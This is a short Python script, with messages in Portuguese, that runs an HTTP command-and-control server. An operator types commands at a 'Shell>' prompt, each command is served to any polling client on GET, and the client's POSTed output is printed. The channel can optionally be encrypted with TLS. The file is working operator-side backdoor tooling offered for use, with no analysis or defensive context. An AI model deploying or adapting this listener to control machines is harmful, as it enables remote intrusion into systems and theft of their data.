import http.server
import argparse as ap

def connection(host, port, enc):
    try:
        server_class = http.server.HTTPServer
        httpd = server_class((host, port), MyHandler)
        if enc:
            import ssl
            context = ssl.SSLContext()
            context.check_hostname = False
            context.load_cert_chain('cert.pem', 'key.pem')
            # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
            httpd.socket = context.wrap_socket(httpd.socket, 
                server_side=True)
    except Exception as e:
        print('Não foi possível levantar o servidor!')
        raise e

    try:
        httpd.serve_forever()
        print('Servidor está funcional. Aguardando conexões...')
    except KeyboardInterrupt:
        print('[!] Servidor terminado.')
        httpd.server_close()
    except Exception as e:
        raise e('Erro!')

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(request):
        command = input("Shell> ")
        request.send_response(200)
        request.send_header("Content-type", "text/html")
        request.end_headers()
        request.wfile.write(command.encode('latin'))

    def do_POST(request):
        request.send_response(200)
        request.end_headers()
        length  = int(request.headers['Content-Length'])
        postVar = request.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    parser = ap.ArgumentParser(description='Pequeno servidor web para enviar comandos.')
    parser.add_argument('-i', '--ip', help='O endereço IP a ser usado.', 
        required=True)
    parser.add_argument('-p', '--port', help='A porta a ser usada.', 
        required=True, 
        type=int)
    parser.add_argument('-s', '--ssl', help='Use esta opção caso queira usar SSL/TLS.', 
        action='store_true')
    
    args = parser.parse_args()

    connection(args.ip, args.port, args.ssl)
